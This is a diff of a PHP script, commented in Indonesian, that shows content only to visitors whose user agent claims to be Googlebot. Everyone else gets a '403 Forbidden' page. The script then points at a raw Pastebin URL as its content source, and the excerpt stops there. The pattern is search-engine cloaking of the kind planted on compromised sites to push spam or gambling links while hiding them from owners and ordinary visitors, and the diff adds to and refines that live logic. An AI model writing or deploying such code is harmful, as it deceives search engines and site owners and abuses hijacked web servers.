@@ -1,10 +1,15 @@
 <?php
 if (isset($_GET['post'])) {
-  $is_googlebot = preg_match('/Googlebot/i', $_SERVER['HTTP_USER_AGENT']);
+    // Deteksi apakah pengunjung adalah robot Google
+    $is_googlebot = preg_match('/Googlebot/i', $_SERVER['HTTP_USER_AGENT']);
 
-  if (!$is_googlebot) {
-      exit; 
-  }
+    if (!$is_googlebot) {
+        // Jika bukan robot Google, tampilkan halaman kosong atau pesan
+        header("HTTP/1.1 403 Forbidden");
+        echo "<h1>403 Forbidden</h1>";
+        echo "<p>Konten ini hanya untuk robot pencari Google.</p>";
+        exit; // Hentikan eksekusi lebih lanjut
+    }
     $filename = "https://pastebin.com/raw/mqCJTET3";
     $katafile = "https://pastebin.com/raw/mqCJTET3";
     
